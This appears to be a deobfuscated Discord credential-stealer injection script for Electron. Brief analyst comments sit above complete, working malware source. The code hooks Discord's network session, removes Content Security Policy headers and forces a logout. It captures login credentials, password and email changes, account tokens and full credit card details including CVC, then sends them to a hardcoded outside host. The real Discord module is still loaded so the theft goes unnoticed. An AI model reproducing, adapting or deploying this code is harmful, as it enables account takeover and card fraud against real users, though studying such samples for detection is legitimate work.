// Deobfuscated Discord Injection Script
// Key Transformations:
// - Removed obfuscation techniques like string concatenation, variable mangling, and control flow flattening.
// - Renamed variables and functions to meaningful names based on their purpose (e.g., 'Filter' remains as is, but added comments for clarity).
// - Simplified expressions and removed unnecessary constructs.
// - Preserved original logic for functional equivalence.

// Malicious Behaviors:
// - Intercepts user login, password changes, email changes, and credit card additions.
// - Exfiltrates sensitive data (tokens, passwords, emails, credit cards) to a hardcoded attacker-controlled endpoint: "https://bby.rip/c1d".
// - On first run, forces a logout to potentially capture credentials during re-login.
// - Modifies web requests to bypass content security policies and hook specific URLs for data theft.
// - This script is injected into Discord's core module to run within the Electron app.

const fs = require('fs');
const path = require("path");
const { BrowserWindow, session } = require("electron");
const querystring = require("querystring");

// Check if this is the first execution by looking for a marker directory.
// If first time, create the directory and force a logout to capture credentials on re-login.
function FirstTime() {
  if (!fs.existsSync(path.join(__dirname, "bbystealer"))) return true;
  fs.rmdirSync(path.join(__dirname, "bbystealer"));
  // Execute JavaScript in the Discord window to force logout.
  return BrowserWindow.getAllWindows()[0].webContents.executeJavaScript(
    'window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();',
    true
  ).then(response => {}), ![];
}

// URL filters for intercepting Discord API calls related to user data and authentication.
const Filter = {
  'urls': [
    "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
    "https://*.discord.com/api/v*/applications/detectable",
    "https://discord.com/api/v*/applications/detectable",
    "https://*.discord.com/api/v*/users/@me/library",
    "https://discord.com/api/v*/users/@me/library",
    "https://*.discord.com/api/v*/users/@me/billing/subscriptions",
    "https://discord.com/api/v*/users/@me/billing/subscriptions",
    "wss://remote-auth-gateway.discord.gg/*"
  ]
};

// Intercept web requests to block WebSocket auth on first run and allow others.
session.defaultSession.webRequest.onBeforeRequest(Filter, (details, callback) => {
  if (FirstTime()) details["url"].startsWith("wss://") ? callback({ 'cancel': true }) : callback({ 'cancel': false });
});

// Modify response headers to bypass Content Security Policy for injection.
session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
  delete details["responseHeaders"]["content-security-policy"];
  delete details["responseHeaders"]["content-security-policy-report-only"];
  callback({
    'responseHeaders': {
      ...details["responseHeaders"],
      'Access-Control-Allow-Headers': '*'
    }
  });
});

// Function to send stolen data to the attacker's server via POST.
// Malicious: Exfiltrates user data to "https://bby.rip/c1d".
function SendToApi(payload) {
  BrowserWindow.getAllWindows()[0].webContents.executeJavaScript(
    'var xhr = new XMLHttpRequest(); xhr.open("POST", "https://bby.rip/c1d", true); xhr.setRequestHeader(\'Content-Type\', \'application/json\'); xhr.setRequestHeader(\'Access-Control-Allow-Origin\', \'*\'); xhr.send(JSON.stringify(' + payload + "));",
    true
  );
}

// Capture and send login credentials and user info.
// Malicious: Steals email, password, token, and user profile details.
function Login(email, password, token) {
  BrowserWindow.getAllWindows()[0].webContents.executeJavaScript(
    'var xmlHttp = new XMLHttpRequest();xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );xmlHttp.setRequestHeader("Authorization", "' + token + '"); xmlHttp.send( null );xmlHttp.responseText;',
    true
  ).then(response => {
    var user = JSON.parse(response);
    var payload = {
      'username': user["username"] + '#' + user["discriminator"],
      'id': user['id'],
      'avatar': user["avatar"],
      'nitro': user["premium_type"],
      'badges': user["flags"],
      'email': email,
      'password': password,
      'token': token,
      'type': "login"
    };
    SendToApi(JSON.stringify(payload));
  });
}

// Capture and send password change details.
// Malicious: Steals old/new passwords and token.
function ChangePassword(password, new_password, token) {
  BrowserWindow.getAllWindows()[0].webContents.executeJavaScript(
    'var xmlHttp = new XMLHttpRequest(); xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false ); xmlHttp.setRequestHeader("Authorization", "' + token + '"); xmlHttp.send( null ); xmlHttp.responseText;',
    true
  ).then(response => {
    var user = JSON.parse(response);
    var payload = {
      'username': user["username"] + '#' + user["discriminator"],
      'avatar': user["avatar"],
      'id': user['id'],
      'nitro': user["premium_type"],
      'badges': user["flags"],
      'email': user["email"],
      'new_password': new_password,
      'password': password,
      'token': token,
      'type': "changedpassword"
    };
    SendToApi(JSON.stringify(payload));
  });
}

// Capture and send email change details.
// Malicious: Steals new email, password, and token.
function ChangeEmail(email, password, token) {
  BrowserWindow.getAllWindows()[0].webContents.executeJavaScript(
    'var xmlHttp = new XMLHttpRequest(); xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false ); xmlHttp.setRequestHeader("Authorization", "' + token + '"); xmlHttp.send( null ); xmlHttp.responseText;',
    true
  ).then(response => {
    var user = JSON.parse(response);
    var payload = {
      'username': user["username"] + '#' + user["discriminator"],
      'id': user['id'],
      'avatar': user["avatar"],
      'nitro': user["premium_type"],
      'badges': user["flags"],
      'email': email,
      'password': password,
      'token': token,
      'type': "changedemail"
    };
    SendToApi(JSON.stringify(payload));
  });
}

// Capture and send credit card addition details.
// Malicious: Steals credit card number, CVC, expiry, and token.
function CreditCardAdded(credit_card_numbers, cvc, expire_month, expire_year, token) {
  BrowserWindow.getAllWindows()[0].webContents.executeJavaScript(
    'var xmlHttp = new XMLHttpRequest(); xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false ); xmlHttp.setRequestHeader("Authorization", "' + token + '"); xmlHttp.send( null ); xmlHttp.responseText;',
    true
  ).then(response => {
    var user = JSON.parse(response);
    var payload = {
      'username': user["username"] + '#' + user["discriminator"],
      'id': user['id'],
      'avatar': user["avatar"],
      'nitro': user["premium_type"],
      'badges': user["flags"],
      'email': user["email"],
      'cc_num': credit_card_numbers,
      'expire_year': expire_year,
      'expire_month': expire_month,
      'token': token,
      'cvc': cvc,
      'type': "creditcard"
    };
    SendToApi(JSON.stringify(payload));
  });
}

// Filters for intercepting API calls related to login, user updates, and payments.
const ChangePasswordFilter = {
  'urls': [
    "https://discord.com/api/v*/users/@me",
    "https://discordapp.com/api/v*/users/@me",
    "https://*.discord.com/api/v*/users/@me",
    "https://discordapp.com/api/v*/auth/login",
    "https://discord.com/api/v*/auth/login",
    "https://*.discord.com/api/v*/auth/login",
    "https://api.stripe.com/v*/tokens"
  ]
};

// Hook completed requests to capture and process sensitive actions.
session.defaultSession.webRequest.onCompleted(ChangePasswordFilter, (details, _) => {
  // Handle login requests.
  if (details["url"].endsWith("login")) {
    if (details.statusCode == 200) {
      const login_details = JSON.parse(Buffer.from(details["uploadData"][0]["bytes"]).toString());
      const email = login_details["login"];
      const password = login_details["password"];
      // Extract token and send login data.
      BrowserWindow.getAllWindows()[0].webContents.executeJavaScript(
        'for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;',
        true
      ).then(token => {
        Login(email, password, token);
      });
    }
  }

  // Handle user profile updates (password/email changes).
  if (details["url"].endsWith("users/@me")) {
    if (details.statusCode == 200 && details["method"] == "PATCH") {
      const user_info = JSON.parse(Buffer.from(details["uploadData"][0]["bytes"]).toString());
      // Check for password change.
      if (user_info["password"] != null && user_info["password"] != undefined && user_info["password"] != '') {
        if (user_info["new_password"] != undefined && user_info["new_password"] != null && user_info["new_password"] != '') {
          BrowserWindow.getAllWindows()[0].webContents.executeJavaScript(
            'for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;',
            true
          ).then(token => {
            ChangePassword(user_info["password"], user_info["new_password"], token);
          });
        }
      }
      // Check for email change.
      if (user_info["email"] != null && user_info["email"] != undefined && user_info["email"] != '') {
        BrowserWindow.getAllWindows()[0].webContents.executeJavaScript(
          'for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;',
          true
        ).then(token => {
          ChangeEmail(user_info["email"], user_info["password"], token);
        });
      }
    }
  }

  // Handle credit card token creation.
  if (details["url"].endsWith("tokens")) {
    credit_card = querystring.parse(decodeURIComponent(Buffer.from(details["uploadData"][0]["bytes"]).toString()));
    BrowserWindow.getAllWindows()[0].webContents.executeJavaScript(
      'for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;',
      true
    ).then(token => {
      CreditCardAdded(credit_card["card[number]"], credit_card["card[cvc]"], credit_card["card[exp_month]"], credit_card["card[exp_year]"], token);
    });
  }
});

// Load the original Discord core module.
module.exports = require("./core.asar");
